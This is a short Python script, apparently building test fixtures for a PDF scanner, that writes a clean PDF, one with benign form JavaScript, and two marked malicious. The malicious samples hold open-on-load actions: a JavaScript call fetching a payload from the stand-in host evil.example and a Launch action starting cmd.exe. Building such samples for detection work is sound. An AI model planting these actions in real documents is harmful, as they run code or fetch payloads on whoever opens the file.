from pathlib import Path


ROOT = Path(__file__).resolve().parent / "samples"
ROOT.mkdir(parents=True, exist_ok=True)


def write_pdf(name: str, body: str) -> None:
    content = f"""%PDF-1.4
1 0 obj
<< /Type /Catalog {body} >>
endobj
trailer
<< /Root 1 0 R >>
%%EOF
"""
    (ROOT / name).write_text(content, encoding="latin-1")


write_pdf("clean.pdf", "/Pages 2 0 R")
write_pdf(
    "legit_form_js.pdf",
    """/AcroForm << /Fields [2 0 R] >>
    /AA << /K << /S /JavaScript /JS (AFNumber_Keystroke\\(2, 0, 0, 0, "", true\\); event.rc = true;) >> >>""",
)
write_pdf(
    "malicious_openaction.pdf",
    """/OpenAction << /S /JavaScript /JS (app.launchURL\\("http://evil.example/payload", true\\);) >>""",
)
write_pdf(
    "malicious_launch.pdf",
    """/OpenAction << /S /Launch /F (cmd.exe) >>""",
)
